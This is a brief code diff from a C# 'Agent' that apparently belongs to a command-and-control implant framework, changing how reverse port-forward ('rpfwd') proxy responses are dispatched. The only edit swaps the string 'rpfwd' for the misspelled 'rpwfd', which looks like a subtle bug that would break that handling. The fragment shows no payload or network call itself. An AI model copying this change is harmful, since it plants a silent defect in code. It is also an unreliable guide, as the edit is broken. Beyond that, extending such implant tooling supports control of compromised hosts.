@@ -110,7 +110,7 @@ namespace Agent
 
             if (args.tasking_response.rpfwd is not null)
             {
-                this.taskManager.HandleProxyResponses("rpfwd", args.tasking_response.rpfwd);
+                this.taskManager.HandleProxyResponses("rpwfd", args.tasking_response.rpfwd);
             }
 
             if (args.tasking_response.delegates is not null)
